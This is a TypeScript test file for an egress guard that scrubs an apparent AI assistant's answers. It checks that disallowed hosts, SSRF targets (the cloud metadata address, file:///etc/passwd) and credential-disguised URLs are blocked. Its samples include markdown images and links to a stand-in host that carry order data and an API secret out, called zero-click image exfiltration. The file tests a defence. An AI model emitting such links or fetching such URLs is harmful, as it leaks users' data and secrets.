import { describe, it, expect } from "vitest";
import { checkUrl, guardOutbound, redactSecrets, scrubOutbound, type EgressPolicy } from "./outbound.ts";

const policy: EgressPolicy = {
  allowedHosts: ["docs.acme.example", "acme.example"],
  secrets: ["sk-live-8812-SECRET"],
};

describe("checkUrl", () => {
  it("allows an exact allow-listed host", () => {
    expect(checkUrl("https://docs.acme.example/refunds", policy).allowed).toBe(true);
  });

  it("denies anything not on the list", () => {
    const d = checkUrl("https://evil.example/p?d=hello", policy);
    expect(d.allowed).toBe(false);
    expect(d.reason).toContain("not on the egress allow-list");
  });

  it("is not fooled by a host that merely contains an allowed one", () => {
    expect(checkUrl("https://acme.example.evil.example/x", policy).allowed).toBe(false);
    expect(checkUrl("https://evil-acme.example/x", policy).allowed).toBe(false);
  });

  it("denies credentials in the URL, which disguise the real host", () => {
    const d = checkUrl("https://docs.acme.example@evil.example/x", policy);
    expect(d.allowed).toBe(false);
    expect(d.reason).toContain("credentials");
  });

  it("denies non-http schemes", () => {
    expect(checkUrl("data:text/html,<script>", policy).allowed).toBe(false);
    expect(checkUrl("file:///etc/passwd", policy).allowed).toBe(false);
    expect(checkUrl("javascript:alert(1)", policy).allowed).toBe(false);
  });

  it("denies internal addresses, the SSRF door", () => {
    expect(checkUrl("http://169.254.169.254/latest/meta-data/", policy).allowed).toBe(false);
    expect(checkUrl("http://localhost:8080/admin", policy).allowed).toBe(false);
    expect(checkUrl("http://billing.internal/keys", policy).allowed).toBe(false);
  });
});

describe("scrubOutbound", () => {
  it("removes the zero-click image exfiltration, which is the whole attack", () => {
    const answer = "Here is your summary.\n\n![](https://evil.example/p?d=order-1001-total-42)";
    const { clean, removed } = scrubOutbound(answer, policy);

    expect(clean).not.toContain("evil.example");
    expect(clean).toContain("[image removed");
    expect(removed).toEqual(["https://evil.example/p?d=order-1001-total-42"]);
  });

  it("keeps an image that points somewhere allowed", () => {
    const answer = "![chart](https://docs.acme.example/chart.png)";
    expect(scrubOutbound(answer, policy).clean).toBe(answer);
  });

  it("keeps link text but drops a disguised target", () => {
    const answer = "Read the [refund policy](https://evil.example/steal?d=secret).";
    const { clean } = scrubOutbound(answer, policy);
    expect(clean).toContain("refund policy [link removed]");
    expect(clean).not.toContain("evil.example");
  });

  it("removes a bare URL to a disallowed host", () => {
    const { clean } = scrubOutbound("See https://evil.example/p?d=x for details.", policy);
    expect(clean).toBe("See [url removed] for details.");
  });

  it("leaves an ordinary answer completely untouched", () => {
    const answer = "Your order o-1001 was refunded. See https://docs.acme.example/refunds.";
    expect(scrubOutbound(answer, policy).clean).toBe(answer);
  });
});

describe("redactSecrets", () => {
  it("makes a leak useless even if something upstream failed", () => {
    const { clean, removed } = redactSecrets("the key is sk-live-8812-SECRET ok", [
      "sk-live-8812-SECRET",
    ]);
    expect(clean).toBe("the key is [redacted] ok");
    expect(removed).toEqual(["sk-l..."]);
  });
});

describe("guardOutbound", () => {
  it("redacts first, then strips destinations, so a secret cannot ride out in a URL", () => {
    const answer = "done ![](https://evil.example/p?d=sk-live-8812-SECRET)";
    const { clean, removed } = guardOutbound(answer, policy);

    expect(clean).not.toContain("sk-live-8812-SECRET");
    expect(clean).not.toContain("evil.example");
    expect(removed).toHaveLength(2); // the secret, and the destination
  });
});
